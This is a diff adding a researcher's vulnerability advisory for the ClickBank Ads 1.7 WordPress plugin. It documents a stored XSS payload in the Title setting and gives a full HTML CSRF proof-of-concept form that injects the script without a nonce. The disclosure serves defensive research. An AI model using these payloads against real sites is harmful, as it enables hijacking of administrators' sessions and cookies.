@@ -1,0 +1,84 @@
+================================================================
+CSRF/Stored XSS Vulnerability in ClickBank Ads V 1.7 Plugin 
+================================================================
+
+
+. contents:: Table Of Content
+
+Overview
+========
+
+* Title :CSRF and Stored XSS Vulnerability in ClickBank Ads  Wordpress Plugin 
+* Author: Kaustubh G. Padwad
+* Plugin Homepage: https://wordpress.org/plugins/clickbank-ads-clickbank-widget/
+* Severity: HIGH
+* Version Affected: Version  1.7 and mostly prior to it
+* Version Tested : Version  1.7
+* version patched:
+
+Description 
+===========
+
+Vulnerable Parameter 
+--------------------
+* Title:
+
+About Vulnerability
+-------------------
+This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin's browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc.
+
+Vulnerability Class
+=================== 
+Cross Site Request Forgery (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
+Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)
+
+Steps to Reproduce: (POC)
+=========================
+
+After installing the plugin
+
+1. Goto Dashboard --> Setting --> ClickBank Ads --> Title
+
+2. Insert this payload ## "><script>+-+-1-+-+alert(document.cookie)</script> ## Into  above mention Vulnerable parameter Save settings and see XSS in action
+
+3. Visit Click Ads settings page of this plugin anytime later and you can see the script executing as it is stored.
+
+Plugin does not uses any nonces and hence, the same settings can be changed using CSRF attack and the PoC code for the same is below
+
+CSRF POC Code
+=============
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/wp/wp-admin/options-general.php?page=clickbank-ads-clickbank-widget/clickbank-ads.php" method="POST">
+      <input type="hidden" name="cbwec[title]" value="">>><script>+-+-1-+-+alert(document.cookie)</script>" />
+      <input type="hidden" name="cbwec[name]" value="kaustubh" />
+      <input type="hidden" name="cbwec[keywordbytitle2]" value="Title" />
+      <input type="hidden" name="cbwec[keywords]" value="" />
+      <input type="hidden" name="cbwec[adformat]" value="1" />
+      <input type="hidden" name="cbwec[width2]" value="100%" />
+      <input type="hidden" name="cbwec[width]" value="100%" />
+      <input type="hidden" name="cbwec[height]2" value="220" />
+      <input type="hidden" name="cbwec[height]" value="220" />
+      <input type="hidden" name="cbwec[pos]" value="Top" />
+      <input type="hidden" name="cbwec[bordstyle]" value="1" />
+      <input type="hidden" name="cbwec[bordcolor]" value="CCCCCC" />
+      <input type="hidden" name="cbwec[linkcolor]" value="0000FF" />
+      <input type="hidden" name="cbwec[runplugin]" value="1" />
+      <input type="hidden" name="cbwec[homepage]" value="1" />
+      <input type="hidden" name="cbwec[onlypost]" value="1" />
+      <input type="hidden" name="cbwec_submit" value="Save »" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+credits
+=======
+* Kaustubh Padwad 
+* Information Security Researcher
+* kingkaustubh (at) me (dot) com 
+* https://twitter.com/s3curityb3ast
+* http://breakthesec.com
+* https://www.linkedin.com/in/kaustubhpadwad
